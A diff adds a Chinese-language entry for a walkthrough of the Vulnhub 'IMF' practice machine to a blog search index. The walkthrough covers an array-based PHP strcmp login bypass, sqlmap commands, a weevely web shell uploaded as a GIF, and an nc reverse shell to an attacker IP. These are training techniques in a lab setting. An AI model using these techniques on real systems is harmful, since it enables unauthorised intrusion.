@@ -1,6 +1,55 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>IMF</title>
+    <url>/2020/03/14/IMF/</url>
+    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/14/IMF/image-20200314185633352.png" alt="image-20200314185633352"></p>
+<p>就一个80</p>
+<h1 id="0x01-flag1"><a href="#0x01-flag1" class="headerlink" title="0x01 flag1"></a><strong>0x01 flag1</strong></h1><p>看源码就行了</p>
+<p><img src="/2020/03/14/IMF/image-20200314185815358.png" alt="image-20200314185815358"></p>
+<p>base64解这个flag 提示我们allthefiles<img src="/2020/03/14/IMF/image-20200314185917680.png" alt="image-20200314185917680"></p>
+<h1 id="0x02-flag2"><a href="#0x02-flag2" class="headerlink" title="0x02 flag2"></a><strong>0x02 flag2</strong></h1><p>我们再细看 这几行js有点怪 拼起来得到flag2 提示imfadministrator</p>
+<p><img src="/2020/03/14/IMF/image-20200314190308552.png" alt="image-20200314190308552"></p>
+<p><img src="/2020/03/14/IMF/image-20200314190426313.png" alt="image-20200314190426313"></p>
+<p><img src="/2020/03/14/IMF/image-20200314190511844.png" alt="image-20200314190511844"></p>
+<h1 id="0x03-flag3"><a href="#0x03-flag3" class="headerlink" title="0x03 flag3"></a><strong>0x03 flag3</strong></h1><p>根据给的路径发现登陆页面<br>根据回显发现rmichaels用户名存在<br>查看源码发现密码使用硬编码<br>如果是硬编码的，我们猜测他使用了strcmp函数，strcmp()是对于相等的字符串返回0，不同的字符串返回非0，但如果比较非字符串，strcmp()将返回null。在php中null==0是true。使得数组看起来与硬编码的密码字符串匹配。<br>所以我们此处传一个数组，将pass字段重命名为pass[]。<br>用户名使用rmichaels，将pass字段重命名为pass[]。</p>
+<p><img src="/2020/03/14/IMF/image-20200314220716954.png" alt="image-20200314220716954"></p>
+<p><img src="/2020/03/14/IMF/image-20200314220834567.png" alt="image-20200314220834567"></p>
+<p><img src="/2020/03/14/IMF/image-20200314220905157.png" alt="image-20200314220905157"></p>
+<h1 id="0x04-flag4"><a href="#0x04-flag4" class="headerlink" title="0x04 flag4"></a><strong>0x04 flag4</strong></h1><p>进到IMF里pagename参数有个upload有注入 sqlmap走起</p>
+<p><img src="/2020/03/14/IMF/image-20200314221515461.png" alt="image-20200314221515461"></p>
+<p>sqlmap -u “<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> –cookie “PHPSESSID=dfij6638dhhltl0vplg5q71um3” –dbs</p>
+<p><img src="/2020/03/14/IMF/image-20200314222022401.png" alt="image-20200314222022401"></p>
+<p>跑admin<br>sqlmap -u “<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> –cookie “PHPSESSID=dfij6638dhhltl0vplg5q71um3” -D admin –tables<br><img src="/2020/03/14/IMF/image-20200314222132550.png" alt="image-20200314222132550"></p>
+<p>新页面<br><img src="/2020/03/14/IMF/image-20200314222241091.png" alt="image-20200314222241091"></p>
+<p><img src="/2020/03/14/IMF/image-20200314222527908.png" alt="image-20200314222527908"></p>
+<p>扫扫更健康</p>
+<p><img src="/2020/03/14/IMF/image-20200314222607823.png" alt="image-20200314222607823"></p>
+<p>解码<br><img src="/2020/03/14/IMF/image-20200314222659426.png" alt="image-20200314222659426"></p>
+<h1 id="0x05-flag5"><a href="#0x05-flag5" class="headerlink" title="0x05 flag5"></a><strong>0x05 flag5</strong></h1><p>访问下解码后的php</p>
+<p><img src="/2020/03/14/IMF/image-20200314222754725.png" alt="image-20200314222754725"></p>
+<p>亲自试水 常规上传别试了 上weevely吧<br>weevely generate t00r ~/shell.php<br><img src="/2020/03/14/IMF/image-20200314223138650.png" alt="image-20200314223138650"><br>改个文件头 文件后缀也变gif<br><img src="/2020/03/14/IMF/image-20200314223316403.png" alt="image-20200314223316403"><br>上传成功</p>
+<p><img src="/2020/03/14/IMF/image-20200314224722194.png" alt="image-20200314224722194"></p>
+<p>源码里这个就是文件落地后的名字<br><img src="/2020/03/14/IMF/image-20200314225025848.png" alt="image-20200314225025848"></p>
+<p>连接后查看flag5 解码<br><img src="/2020/03/14/IMF/image-20200314225510979.png" alt="image-20200314225510979"><br>提示agentservices</p>
+<h1 id="0x06-flag6"><a href="#0x06-flag6" class="headerlink" title="0x06 flag6"></a><strong>0x06 flag6</strong></h1><p>nc去弄个交互式shell<br>攻击机：nc -lvp 2333<br>靶机：:backdoor_reversetcp 192.168.0.106 2333<br><img src="/2020/03/14/IMF/image-20200314230121345.png" alt="image-20200314230121345"></p>
+<p>ps -aux看看进程 发现有knock进程怪不得开始信息收集时候只有80端口<br><img src="/2020/03/14/IMF/image-20200314230358950.png" alt="image-20200314230358950"><br>再看看网络 netstat -antp 发现个7788</p>
+<p><img src="/2020/03/14/IMF/image-20200314230649667.png" alt="image-20200314230649667"></p>
+<p>进一步了解下 之前的flag5提示我们也是代理</p>
+<p><img src="/2020/03/14/IMF/image-20200314230734515.png" alt="image-20200314230734515"></p>
+<p>find全局查agent文件 打开两个</p>
+<p><img src="/2020/03/14/IMF/image-20200314231323432.png" alt="image-20200314231323432"></p>
+<p>根据敲门密码 敲端口</p>
+<p><img src="/2020/03/14/IMF/image-20200314232557766.png" alt="image-20200314232557766"></p>
+]]></content>
+      <categories>
+        <category>靶机</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub 靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Pwnlab_init</title>
     <url>/2020/03/12/Pwnlab-init/</url>
     <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/12/Pwnlab-init/image-20200312222253552.png" alt="image-20200312222253552"></p>
